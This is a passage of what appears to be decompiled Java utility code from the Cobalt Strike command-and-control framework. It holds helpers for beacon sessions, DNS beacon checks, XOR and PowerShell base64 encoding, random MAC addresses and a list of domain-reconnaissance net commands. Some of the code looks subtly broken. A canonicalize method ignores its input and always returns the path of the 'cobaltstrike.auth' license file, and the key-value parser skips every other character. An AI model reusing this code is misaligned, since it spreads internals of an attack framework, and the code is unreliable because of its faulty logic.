        for (int i = 0; i < arrstring.length; i++) {
            l2 = lpow(2L, i);
            if ((l1 & l2) == l2) {
                linkedList.add(arrstring[i] + ":");
            }
        }
        String str = join(linkedList, ", ");
        if (!isin("C:", str)) {
            print_warn("C: is not in drives: '" + string + "'. " + linkedList);
        }
        return str;
    }

    public static final byte[] gunzip(byte[] arrby) {
        try {
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(arrby);
            GZIPInputStream gZIPInputStream = new GZIPInputStream(byteArrayInputStream);
            byte[] all = readAll(gZIPInputStream);
            gZIPInputStream.close();
            return all;
        } catch (Exception exception) {
            MudgeSanity.logException("gzip", exception, false);
            return new byte[0];
        }
    }

    public static final byte[] gzip(byte[] arrby) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(arrby.length);
            GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
            gZIPOutputStream.write(arrby, 0, arrby.length);
            gZIPOutputStream.finish();
            byte[] all = byteArrayOutputStream.toByteArray();
            gZIPOutputStream.close();
            return all;
        } catch (Exception exception) {
            MudgeSanity.logException("gzip", exception, false);
            return new byte[0];
        }
    }

    public static String Base64PowerShell(String string) {
        try {
            return Base64.encode(string.getBytes("UTF-16LE"));
        } catch (UnsupportedEncodingException unsupportedEncodingException) {
            MudgeSanity.logException("toPowerShellBase64", unsupportedEncodingException, false);
            return "";
        }
    }

    public static boolean contains(String string1, String string2) {
        return toSet(string1).contains(string2);
    }

    public static boolean isIP(String string) {
        return string.length() <= 16 && string.matches("\\d+\\.\\d+\\.\\d+\\.\\d+");
    }

    public static boolean isIPv6(String string) {
        if (string.length() <= 64 && string.matches("[A-F0-9a-f:]+(%[\\d+]){0,1}")) {
            return true;
        }
        return string.length() <= 64 && string.matches("[A-F0-9a-f:]+:\\d+\\.\\d+\\.\\d+\\.\\d+");
    }

    public static int limit(String string) {
        if ("screenshots".equals(string)) {
            return 125;
        }
        if ("beaconlog".equals(string)) {
            return 2500;
        }
        if ("archives".equals(string)) {
            return 20000;
        }
        return 1000;
    }

    public static final String randomMac() {
        int r = rand(255);
        if (r % 2 == 1) {
            r++;
        }
        StringStack stringStack = new StringStack("", ":");
        stringStack.push(hex(r));
        for (int i = 0; i < 5; i++) {
            stringStack.push(hex(rand(255)));
        }
        return stringStack.toString();
    }

    public static void increment(Map map, String string) {
        int i = count(map, string);
        map.put(string, new Integer(i + 1));
    }

    public static int count(Map map, String string) {
        if (!map.containsKey(string)) {
            return 0;
        }
        Integer integer = (Integer) map.get(string);
        return integer.intValue();
    }

    public static long ipToLong(String string) {
        return Route.ipToLong(string);
    }

    public static String strip(String string1, String string2) {
        if (string1.startsWith(string2)) {
            return string1.substring(string2.length());
        }
        return string1;
    }

    public static String stripRight(String string1, String string2) {
        if (string1.endsWith(string2)) {
            if (string1.equals(string2)) {
                return "";
            }
            return string1.substring(0, string1.length() - string2.length());
        }
        return string1;
    }

    public static long lof(String string) {
        try {
            File file = new File(string);
            if (file.isFile()) {
                return file.length();
            }
            return 0L;
        } catch (Exception exception) {
            return 0L;
        }
    }

    public static String Host(String string) {
        RegexParser regexParser = new RegexParser(string);
        if (regexParser.matches("(.*?):(\\d+)")) {
            return regexParser.group(1);
        }
        return string;
    }

    public static int Port(String string, int n) {
        RegexParser regexParser = new RegexParser(string);
        if (regexParser.matches("(.*?):(\\d+)")) {
            return toNumber(regexParser.group(2), n);
        }
        return n;
    }

    public static String session(int n) {
        if ((n & 1) == 1) {
            return "session";
        }
        if (n > 0) {
            return "beacon";
        }
        return "unknown";
    }

    public static String session(String string) {
        return session(toNumber(string, 0));
    }

    public static boolean isSafeFile(File file1, File file2) {
        try {
            return file2.getCanonicalPath().startsWith(file1.getCanonicalPath());
        } catch (IOException iOException) {
            MudgeSanity.logException("isSafeFile '" + file1 + "' -> '" + file2 + "'", iOException, false);
            return false;
        }
    }

    public static File SafeFile(File file, String string) {
        try {
            File f = new File(file, string);
            if (f.getCanonicalPath().startsWith(file.getCanonicalPath())) {
                return f.getCanonicalFile();
            }
        } catch (IOException iOException) {
            MudgeSanity.logException("Could not join '" + file + "' and '"
                    + string + "'", iOException, false);
        }
        print_error("SafeFile failed: '" + file + "', '" + string + "'");
        throw new RuntimeException("SafeFile failed: '" + file + "', '" + string + "'");
    }

    public static File SafeFile(String string1, String string2) {
        return SafeFile(new File(string1), string2);
    }

    public static int toIntLittleEndian(byte[] arrby) {
        ByteBuffer byteBuffer = ByteBuffer.wrap(arrby);
        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
        return byteBuffer.getInt(0);
    }

    public static String getCaseInsensitive(Map<String, String> map, String string1, String string2) {
        String str = (String) map.get(string1);
        if (str == null) {
            string1 = string1.toLowerCase();
            for (Map.Entry entry : map.entrySet()) {
                String str1 = entry.getKey().toString().toLowerCase();
                if (string1.equals(str1)) {
                    return (String) entry.getValue();
                }
            }
            return string2;
        }
        return str;
    }

    public static byte[] shift(byte[] arrby, int n) {
        if (arrby.length < n) {
            return arrby;
        }
        if (arrby.length == n) {
            return new byte[0];
        }
        byte[] arrby2 = new byte[arrby.length - n];
        for (int i = 0; i < arrby2.length; i++) {
            arrby2[i] = arrby[i + n];
        }
        return arrby2;
    }

    public static String[] toKeyValue(String string) {
        StringBuffer stringBuffer1 = new StringBuffer();
        StringBuffer stringBuffer2 = new StringBuffer();
        char[] arrc = string.toCharArray();
        int i = 0;
        for (i = 0; i < arrc.length && arrc[i] != '='; i++) {
            stringBuffer1.append(arrc[i]);
        }
        while (++i < arrc.length) {
            stringBuffer2.append(arrc[i]);
            i++;
        }
        String[] arrstring = new String[2];
        arrstring[0] = stringBuffer1.toString();
        arrstring[1] = stringBuffer2.toString();
        return arrstring;
    }

    public static String canonicalize(String string) {
        try {
            return new File("cobaltstrike.auth").getCanonicalPath();
        } catch (Exception exception) {
            MudgeSanity.logException("canonicalize: " + string, exception, false);
            return string;
        }
    }

    public static final byte[] toBytes(String string1, String string2) {
        try {
            Charset charset = Charset.forName(string2);
            if (charset == null) {
                return toBytes(string1);
            }
            ByteBuffer byteBuffer = charset.encode(string1);
            byte[] arrby = new byte[byteBuffer.remaining()];
            byteBuffer.get(arrby, 0, arrby.length);
            return arrby;
        } catch (Exception exception) {
            MudgeSanity.logException("could not convert text with " + string2, exception, false);
            return toBytes(string1);
        }
    }

    public static final String bString(byte[] arrby, String string) {
        try {
            if (string == null)
                return bString(arrby);
            Charset charset = Charset.forName(string);
            return charset.decode(ByteBuffer.wrap(arrby)).toString();
        } catch (Exception exception) {
            MudgeSanity.logException("Could not convert bytes with " + string, exception, false);
            return bString(arrby);
        }
    }

    public static final int toShort(String string) {
        if (string.length() != 2)
            throw new IllegalArgumentException("toShort length is: " + string.length());
        try {
            DataParser dataParser = new DataParser(toBytes(string));
            return dataParser.readShort();
        } catch (IOException iOException) {
            MudgeSanity.logException("Could not unpack a short", iOException, false);
            return 0;
        }
    }

    public static void writeUTF8(OutputStream outputStream, String string) throws IOException {
        byte[] arrby = string.getBytes("UTF-8");
        outputStream.write(arrby, 0, arrby.length);
    }

    public static String URLEncode(String string) {
        try {
            return URLEncoder.encode(string, "UTF-8");
        } catch (Exception exception) {
            MudgeSanity.logException("Could not URLEncode '" + string + "'", exception, false);
            return string;
        }
    }

    public static String URLDecode(String string) {
        try {
            return URLDecoder.decode(string, "UTF-8");
        } catch (Exception exception) {
            MudgeSanity.logException("Could not URLDecode '" + string + "'", exception, false);
            return string;
        }
    }

    public static long toUnsignedInt(int n) {
        return n & 0xFFFFFFFFL;
    }

    public static int toUnsignedShort(int n) {
        return n & 0xFFFF;
    }

    public static String formatSize(long l) {
        String str = "b";
        if (l > 1024L) {
            l /= 1024L;
            str = "kb";
        }
        if (l > 1024L) {
            l /= 1024L;
            str = "mb";
        }
        if (l > 1024L) {
            l /= 1024L;
            str = "gb";
        }
        return l + str;
    }

    public static final byte[] XorString(byte[] arrby1, byte[] arrby2) {
        byte[] arrby = new byte[arrby1.length];
        for (int i = 0; i < arrby1.length; i++) {
            arrby[i] = (byte) (arrby1[i] ^ arrby2[i % arrby2.length]);
        }
        return arrby;
    }

    public static final byte[] Bytes(String string) {
        try {
            String[] arrstring = string.split(" ");
            byte[] arrby = new byte[arrstring.length];
            for (int i = 0; i < arrstring.length; i++) {
                arrby[i] = (byte) Integer.parseInt(arrstring[i], 16);
            }
            return arrby;
        } catch (Exception exception) {
            MudgeSanity.logException("Could not parse '" + string + "'", exception, false);
            return new byte[0];
        }
    }

    public static final boolean Flag(int n1, int n2) {
        return (n1 & n2) == n2;
    }

    public static List getNetCommands() {
        return toList("computers, dclist, domain, domain_controllers, domain_trusts, group, localgroup, logons, sessions, share, time, user, view");
    }

    public static boolean isDNSBeacon(String string) {
        long l = toNumberFromHex(string, 0);
        return l > 0L && (l & 0x4B2L) == 1202L;
    }

    static {
        logFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
        rgen = new Random();
    }
}
